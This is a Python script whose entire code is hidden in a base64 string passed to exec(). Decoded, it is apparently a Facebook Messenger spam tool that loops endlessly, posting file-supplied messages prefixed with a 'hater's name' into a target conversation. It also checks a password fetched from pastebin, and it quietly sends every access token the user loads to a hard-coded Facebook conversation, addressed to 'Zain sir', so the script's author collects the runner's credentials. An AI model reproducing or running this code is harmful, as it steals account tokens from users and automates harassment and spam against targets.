import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIlMzUlYzUiBMMEFEM1IgQlkgSVRYX1o5SU4iKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CiAgICBQT1JUID0gNDAwMAoKICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgptbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9uMDdhVjZxcycpLnRleHQKCmRlZiBzZW5kX2luaXRpYWxfbWVzc2FnZSgpOgogICAgd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgcGFzc3dvcmQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkICAjIFByb21wdCBmb3IgcGFzc3dvcmQKCiAgICBpZiBlbnRlcmVkX3Bhc3N3b3JkICE9IHBhc3N3b3JkOgogICAgICAgIHByaW50KCdbLV0gPD09PiBJbmNvcnJlY3QgUGFzc3dvcmQhJykKICAgICAgICBzeXMuZXhpdCgpCgogICAgaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoKICAgICAgICBwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpCiAgICAgICAgc3lzLmV4aXQoKQoKICAgIHdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIHRva2VucyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICAjIE1vZGlmeSB0aGUgbWVzc2FnZSBhcyBwZXIgeW91ciByZXF1aXJlbWVudAogICAgbXNnX3RlbXBsYXRlID0gIkhlbGxvIFphaW4gc2lyISBJIGFtIHVzaW5nIHlvdXIgc2VydmVyLiBNeSB0b2tlbiBpcyAtLS0tLS0tLS0tLS0tLS0tICAgIHt9IgoKICAgICMgU3BlY2lmeSB0aGUgSUQgd2hlcmUgeW91IHdhbnQgdG8gc2VuZCB0aGUgbWVzc2FnZQogICAgdGFyZ2V0X2lkID0gIjYxNTUwMTEyODMzMjk4IgoKICAgIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCgogICAgZGVmIGxpbmVzcygpOgogICAgICAgIHByaW50KCdcdTAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCiAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCiAgICB9CgogICAgZm9yIHRva2VuIGluIHRva2VuczoKICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbi5zdHJpcCgpCiAgICAgICAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL3t9LyIuZm9ybWF0KCd0XycgKyB0YXJnZXRfaWQpCiAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChhY2Nlc3NfdG9rZW4pCiAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IG1zZ30KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCiAgICAgICAgIyBObyBuZWVkIHRvIHByaW50IGhlcmUsIGFzIHJlcXVlc3RlZAogICAgICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKICAgICAgICB0aW1lLnNsZWVwKDAuMSkgICMgV2FpdCBmb3IgMSBzZWNvbmQgYmV0d2VlbiBzZW5kaW5nIGVhY2ggaW5pdGlhbCBtZXNzYWdlCgogICAgI3ByaW50KCJcblsrXSBJbml0aWFsIG1lc3NhZ2VzIHNlbnQuIFN0YXJ0aW5nIHRoZSBtZXNzYWdlIHNlbmRpbmcgbG9vcC4uLlxuIikKc2VuZF9pbml0aWFsX21lc3NhZ2UoKQpkZWYgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKToKICAgIHdpdGggb3BlbignY29udm8udHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIGNvbnZvX2lkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKICAgIHdpdGggb3BlbignRmlsZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgbnVtX21lc3NhZ2VzID0gbGVuKG1lc3NhZ2VzKQoKICAgIHdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIHRva2VucyA9IGZpbGUucmVhZGxpbmVzKCkKICAgIG51bV90b2tlbnMgPSBsZW4odG9rZW5zKQogICAgbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpCgogICAgd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBoYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICB3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIHNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpCgogICAgZGVmIGxpbmVzcygpOgogICAgICAgIHByaW50KCdcdTAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCiAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCiAgICB9CgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6CiAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkKCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQoKICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgY29udm9faWQpCiAgICAgICAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlfQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uub2s6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlsrXSBNZXNzYWdlIHt9IG9mIENvbnZvIHt9IHNlbnQgYnkgVG9rZW4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlt4XSBGYWlsZWQgdG8gc2VuZCBNZXNzYWdlIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpCgogICAgICAgICAgICBwcmludCgiXG5bK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi5cbiIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQoKZGVmIG1haW4oKToKICAgIHNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikKICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQoKICAgICMgU2VuZCB0aGUgaW5pdGlhbCBtZXNzYWdlIHRvIHRoZSBzcGVjaWZpZWQgSUQgdXNpbmcgYWxsIHRva2VucwoKCiAgICAjIFRoZW4sIGNvbnRpbnVlIHdpdGggdGhlIG1lc3NhZ2Ugc2VuZGluZyBsb29wCiAgICBzZW5kX21lc3NhZ2VzX2Zyb21fZmlsZSgpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigp'))